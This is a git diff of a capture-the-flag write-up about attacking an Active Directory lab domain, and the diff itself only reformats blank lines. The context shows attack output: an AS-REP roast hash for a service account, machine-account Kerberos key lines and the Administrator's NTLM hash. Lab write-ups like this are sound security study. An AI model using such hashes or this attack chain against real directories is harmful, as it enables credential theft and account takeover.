@@ -108,7 +108,8 @@ After the enumeration of user accounts is finished, we can attempt to abuse a fe
 -  myusers.txt has the two usernames stated above
 
  And I got 
- ```
+ 
+ ```
  $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:673e94a3b1b5d5f8d933f4bd195c5b6a$d0e401e6dfe20a1e1ae75ad61c766ca8326d7ee8924bdf0b09108e18a15baa34f61756914c85610283df33fd352f7b023814a764673711ded6a3c47d7e2abf34ee74e88e54e0fd88be33e1bc6c60e2193d52b26f6630a2dca9a3c568db149300140440d525314f7671f25203994507d8c959cba77117649c0f8cf5748a6bcf072c043ed24df5b61b5debd9a139b28e9b300fc90cac962d7bb151d8e2ad4d7b77254829dcd11143cd9012e4343f85565115e9b7cf99230568108e01700e378f290dd5ed6ea590504e251ec24100deb547903408c55c4dc1518fcb4761612b63d52ec384ec09a47289df142b1d4cecd942ca2e
 
 ```
@@ -243,8 +244,8 @@ ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:aca824f440b3ec7670ca799cdbecb21a
 ATTACKTIVEDIREC$:des-cbc-md5:088c85ecdc9bf7f4
 [*] Cleaning up... 
 ```
-
 the Administrators NTLM hash is `0e0363213e37b94221497260b0bcb4fc`
+
 
 ## Flag Submission 
 
